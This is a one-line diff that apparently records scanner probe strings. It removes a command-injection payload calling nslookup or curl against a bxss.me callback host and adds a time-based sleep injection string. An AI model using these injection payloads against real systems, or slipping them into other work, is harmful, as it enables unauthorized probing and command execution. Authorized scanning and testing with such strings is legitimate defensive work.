@@ -1,1 +1,1 @@
-(nslookup -q=cname hitdflxlyrxisfbf2b.bxss.me||curl hitdflxlyrxisfbf2b.bxss.me))
+555'&&sleep(27*1000)*qustps&&'
